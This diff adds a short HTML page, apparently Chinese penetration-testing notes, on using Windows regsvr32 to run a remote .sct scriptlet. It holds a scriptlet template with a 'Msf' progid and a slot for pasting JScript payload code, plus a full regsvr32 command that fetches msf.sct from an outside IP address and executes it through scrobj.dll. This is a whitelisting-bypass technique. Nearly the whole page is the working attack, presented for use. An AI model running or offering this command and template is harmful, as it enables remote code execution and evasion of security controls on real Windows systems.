@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Regsvr32执行sct文件</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Regsvr32执行sct文件</h1><br/>将JS转换成sct文件上传到我们的Web Server<br />&lt;?XML version=&quot;1.0&quot;?&gt;<br />&lt;scriptlet&gt;<br />&lt;registration<br />    progid=&quot;Msf&quot;<br />    classid=&quot;{F0001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;<br />    &lt;script language=&quot;JScript&quot;&gt;<br />    //paste code here<br />    &lt;/script&gt;<br />&lt;/registration&gt;<br />&lt;/scriptlet&gt;<code><br /></code><br /><h3>方法1：COM Scriptlet代码执行</h3><br />Regsvr32工具通过网络下载一个COM脚本程序（.sct文件），然后在本地机器上注册一个DLL<br />c:\windows\SysWOW64\regsvr32 /s /u /n /i:https://10.51.90.203/demo/msf.sct c:\windows\SysWOW64\scrobj.dll<br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
